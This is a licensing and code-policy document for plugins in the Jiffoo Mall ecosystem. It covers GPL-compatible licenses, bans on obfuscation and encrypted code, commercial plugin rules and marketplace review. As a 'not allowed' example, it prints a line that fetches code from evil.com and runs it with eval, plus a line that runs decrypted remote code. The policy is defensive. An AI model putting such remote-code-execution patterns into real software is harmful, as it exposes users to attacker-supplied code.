# Jiffoo Mall Plugin License Policy

> **Version**: 1.0  
> **Effective Date**: December 2025

This document outlines the licensing requirements for plugins distributed through the Jiffoo ecosystem, including the official Jiffoo Plugin Marketplace.

---

## Core Principle

**All plugins that integrate with Jiffoo Mall core must be distributed under a GPL-compatible license.**

This follows the WordPress model: because Jiffoo Mall is licensed under GPLv2+, any code that is a derivative work of Jiffoo (which includes most plugins) must also be GPL-compatible.

---

## Acceptable Licenses

The following licenses are accepted for Jiffoo plugins:

| License | SPDX Identifier | GPL Compatible |
|---------|-----------------|----------------|
| GNU General Public License v2.0 | GPL-2.0-only | ✅ Yes |
| GNU General Public License v2.0+ | GPL-2.0-or-later | ✅ Yes |
| GNU General Public License v3.0 | GPL-3.0-only | ✅ Yes |
| GNU General Public License v3.0+ | GPL-3.0-or-later | ✅ Yes |
| MIT License | MIT | ✅ Yes |
| Apache License 2.0 | Apache-2.0 | ✅ Yes |
| BSD 2-Clause | BSD-2-Clause | ✅ Yes |
| BSD 3-Clause | BSD-3-Clause | ✅ Yes |

**Recommended**: We recommend GPLv2+ for maximum compatibility with Jiffoo core.

---

## ⛔ Prohibited Practices

The following practices are **strictly prohibited** for any plugin distributed through Jiffoo channels:

### 1. Source Code Obfuscation

**Obfuscation of any kind is NOT allowed.**

This includes but is not limited to:
- JavaScript obfuscators (e.g., `javascript-obfuscator`, `jscrambler`)
- Variable/function name mangling beyond standard minification
- Control flow obfuscation
- String encoding/encryption
- Dead code injection
- Any technique designed to make code harder to read or understand

**What IS allowed:**
- Standard minification (e.g., `terser`, `esbuild`)
- Tree-shaking and dead code elimination
- Source maps (encouraged for debugging)
- TypeScript compilation to JavaScript

### 2. Encrypted Code

**Encrypted or encoded source code is NOT allowed.**

This includes:
- Base64-encoded executable code
- Encrypted JavaScript files
- Code that requires a "license key" to reveal source
- Any form of code protection that hides the source

### 3. Remote Code Execution

**Plugins must not download and execute code from external sources** without explicit user consent and source disclosure.

Prohibited patterns:
```javascript
// ❌ NOT ALLOWED
eval(await fetch('https://evil.com/code.js').then(r => r.text()))

// ❌ NOT ALLOWED  
new Function(decryptedRemoteCode)()
```

Allowed patterns:
```javascript
// ✅ ALLOWED - Calling documented APIs
const data = await fetch('https://api.example.com/data')

// ✅ ALLOWED - Loading published, open-source libraries from CDN
import('https://cdn.jsdelivr.net/npm/lodash@4/lodash.min.js')
```

### 4. License Key Source Protection

**Using license keys to restrict source code access is NOT allowed.**

You MAY:
- Use license keys for feature activation
- Use license keys for API access
- Use license keys for support eligibility

You MAY NOT:
- Use license keys to decrypt/reveal source code
- Use license keys to enable obfuscated code
- Distribute different code (obfuscated vs. clear) based on license status

---

## Commercial Plugins

**Selling plugins is allowed and encouraged!**

You can sell plugins that work with Jiffoo. However:

1. **Source Code Must Be Provided**
   - All customers must receive the complete, unobfuscated source code
   - Source code must be the "preferred form for modification" (not minified)

2. **GPL Rights Apply**
   - Customers have the right to modify the code
   - Customers have the right to redistribute (though you can ask them not to)
   - You cannot restrict these rights

3. **Your Business Model Options**
   - Charge for access/download (like WordPress themes)
   - Charge for support and updates
   - Charge for hosted services
   - Charge for additional features in separate plugins
   - Dual licensing (GPL + commercial for non-GPL uses)

---

## Marketplace Submission Requirements

To submit a plugin to the official Jiffoo Plugin Marketplace:

### Required
- [ ] Complete source code in human-readable form
- [ ] `LICENSE` file with GPL-compatible license
- [ ] `README.md` with installation and usage instructions
- [ ] `package.json` with proper metadata

### Prohibited
- [ ] No obfuscation tools in `devDependencies`
- [ ] No encoded/encrypted source files
- [ ] No remote code loading without disclosure

### Review Process
1. Automated scan for obfuscation patterns
2. Manual code review for security issues
3. License compliance verification
4. Functionality testing

---

## Enforcement

Plugins that violate this policy will be:

1. **Rejected** from the official marketplace
2. **Removed** if already published
3. **Flagged** to the community if distributed elsewhere

Repeat violators may be banned from submitting plugins.

---

## Questions?

- **GitHub Issues**: For policy clarification
- **Email**: plugins@jiffoo.com
- **Community Forum**: For discussions

---

**This policy ensures that Jiffoo remains a truly open platform where users can trust, inspect, and modify the code they run.**

